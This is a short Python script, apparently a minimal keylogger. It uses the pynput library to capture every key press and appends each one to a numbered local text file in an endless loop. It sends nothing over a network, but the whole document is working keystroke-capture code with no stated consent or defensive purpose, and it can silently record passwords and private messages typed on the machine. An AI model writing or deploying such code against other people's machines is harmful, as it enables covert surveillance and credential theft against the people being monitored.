from pynput import keyboard

Ready = False

Filename = 1

print('running')

while not Ready:

    try:

        open(f'Output{Filename}.txt', 'x')

        Ready = True

    except FileExistsError:

        Filename += 1

        Ready = False

while True:
    with keyboard.Events() as events:

        event = events.get()
        File = open(f'Output{Filename}.txt', 'a')
        if event is None:

            pass

        elif not str(event).find('Press'):

            File.write('\n' + str(event))
